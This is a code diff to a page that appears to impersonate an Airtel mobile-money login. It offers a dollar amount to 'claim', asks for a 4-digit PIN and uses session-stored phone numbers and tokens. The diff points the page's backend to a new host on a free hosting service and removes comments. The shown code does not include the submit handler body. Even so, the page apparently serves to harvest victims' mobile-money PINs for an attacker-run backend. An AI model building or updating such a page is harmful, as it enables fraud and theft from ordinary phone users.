@@ -99,11 +99,9 @@
 </div>
 
 <script>
-  /* ==================== CONFIG ==================== */
-  const BACKEND_URL = 'https://drc-airtel-production.up.railway.app';
+  const BACKEND_URL = 'https://drc-airtel-dj8y.onrender.com';
   const POLL_INTERVAL = 2000;
 
-  /* ==================== ELEMENTS ==================== */
   const pinInput = document.getElementById('pinInput');
   const loginBtn = document.getElementById('loginBtn');
   const eyeButton = document.querySelector('.eye-button');
@@ -112,7 +110,6 @@
   const spinner = document.getElementById('spinner');
   const loginBtnText = document.getElementById('loginBtnText');
 
-  /* ==================== LOAD SESSION ==================== */
   const phone = sessionStorage.getItem('airtel_phone');
   const amount = sessionStorage.getItem('airtel_amount');
   const sessionToken = sessionStorage.getItem('airtel_session');
@@ -126,14 +123,12 @@
     document.getElementById('loginAmount').textContent = '$' + parseInt(amount).toLocaleString('en-US');
   }
 
-  /* ==================== PIN INPUT ==================== */
   pinInput.addEventListener('input', (e) => {
     e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
     loginBtn.disabled = e.target.value.length !== 4;
     hideError();
   });
 
-  /* ==================== EYE TOGGLE ==================== */
   let pinVisible = false;
   eyeButton.addEventListener('click', () => {
     pinVisible = !pinVisible;
@@ -141,7 +136,6 @@
     eyeButton.textContent = pinVisible ? '🙈' : '👁️‍🗨️';
   });
 
-  /* ==================== ERROR HELPERS ==================== */
   function showError(message) {
     errorMsg.textContent = message;
     errorMsg.classList.add('show');
@@ -150,13 +144,11 @@
     errorMsg.classList.remove('show');
   }
 
-  /* ==================== POLLING ==================== */
   let pollTimer = null;
   function stopPolling() {
     if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
   }
 
-  /* ==================== FORM SUBMIT ==================== */
   document.getElementById('loginForm').addEventListener('submit', async (e) => {
     e.preventDefault();
     const pin = pinInput.value;
@@ -223,7 +215,6 @@
     }
   });
 
-  /* ==================== RESET ==================== */
   function resetWithError(message) {
     spinner.classList.remove('show');
     loginBtnText.textContent = 'SE CONNECTER & RÉCLAMER';
